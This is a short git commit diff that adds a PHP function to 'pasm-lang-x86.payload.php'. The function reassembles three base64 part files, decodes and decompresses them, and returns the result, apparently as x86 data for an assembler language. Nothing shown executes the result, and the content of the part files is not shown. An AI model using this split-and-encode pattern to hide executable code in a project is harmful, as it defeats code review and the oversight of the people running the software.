050482a2f0971437a293300aaf79150ed5c59cd6
dompipe <inland14@live.com>
2026-08-22 13:03:58 -0400

    PASL x86 payload parts + core fix (sourceLine)

--- pasm-lang-x86.payload.php
+++ pasm-lang-x86.payload.php
@@ -1,1 +1,7 @@
-PLACEHOLDER_PAYLOAD
+<?php declare(strict_types=1);
+function pasm_x86_body(): string {
+    $a = file_get_contents(__DIR__ . '/pasm-lang-x86.p0.b64');
+    $b = file_get_contents(__DIR__ . '/pasm-lang-x86.p1.b64');
+    $c = file_get_contents(__DIR__ . '/pasm-lang-x86.p2.b64');
+    return zlib_decode(base64_decode($a.$b.$c));
+}
